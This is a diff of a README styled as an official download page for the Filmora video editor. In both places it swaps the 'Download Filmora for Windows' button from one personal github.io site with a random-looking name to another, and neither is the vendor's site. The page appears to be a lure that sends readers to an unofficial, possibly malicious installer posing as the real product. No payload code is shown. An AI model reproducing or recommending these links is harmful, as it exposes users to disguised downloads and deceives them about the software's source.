@@ -16,7 +16,7 @@ Filmora is a video editing app for Windows that lets creators trim, enhance, and
 <div align="center">
   <h3>Edit, enhance, and share your story — the Wondershare Filmora video editor built for Windows creators.</h3>
 
-  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://latonyachudyfjpek.github.io/.github/Filmora-Download-App)
+  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://dennisharris62.github.io/.github/Filmora-Download-App)
 
 </div>
 
@@ -90,7 +90,7 @@ For help with Filmora, open the **Help** menu inside the app to reach the built-
 <div align="center">
   <h3>Ready to get started with Filmora?</h3>
 
-  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://latonyachudyfjpek.github.io/.github/Filmora-Download-App)
+  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://dennisharris62.github.io/.github/Filmora-Download-App)
 
 </div>
 
